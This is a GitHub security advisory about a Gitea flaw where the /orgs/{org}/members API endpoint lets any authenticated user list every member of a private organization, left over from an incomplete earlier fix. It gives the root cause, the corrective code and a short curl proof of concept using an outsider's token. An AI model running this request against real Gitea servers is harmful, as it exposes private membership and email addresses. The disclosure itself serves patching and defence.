# [M] Gitea: Private org member list leaked via /members API endpoint — incomplete fix for PR #38145

## Summary
Severity: Medium
Advisory: GHSA-prr9-9mp4-5gp2
CVE: CVE-2026-58427
CWE: CWE-200, CWE-863
Ecosystem: Go
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-prr9-9mp4-5gp2
Type: github-advisory

## Affected
- Go: `gitea.dev` — affected >=0 <1.27.0

## Details
## Summary
PR #38145 fixed ListPublicMembers and IsPublicMember but missed 
ListMembers. Any authenticated user can enumerate ALL members 
(not just public ones) of a private organization.

## Affected Versions
<= v1.26.4 (latest) and main branch

## Root Cause
routers/api/v1/org/member.go — ListMembers():

// Missing check:
if !organization.HasOrgOrUserVisible(ctx, 
    ctx.Org.Organization.AsUser(), ctx.Doer) {
    ctx.APIErrorNotFound()
    return
}

## Proof of Concept

# Setup: privateorg (private), alice = member, bob = outsider

# Bob lists ALL members of private org
curl -s "http://gitea/api/v1/orgs/privateorg/members" \
  -H "Authorization: token BOB_TOKEN"

# Result: HTTP 200
[{"login":"alice","email":"alice@test.com",...}]
# Expected: HTTP 404

## Note
This is an incomplete fix variant of PR #38145.
That PR fixed public_members endpoints only.
ListMembers (/orgs/{org}/members) remains unpatched.

## Fix
Add to ListMembers():
if !organization.HasOrgOrUserVisible(ctx, 
    ctx.Org.Organization.AsUser(), ctx.Doer) {
    ctx.APIErrorNotFound()
    return
}

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-prr9-9mp4-5gp2
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
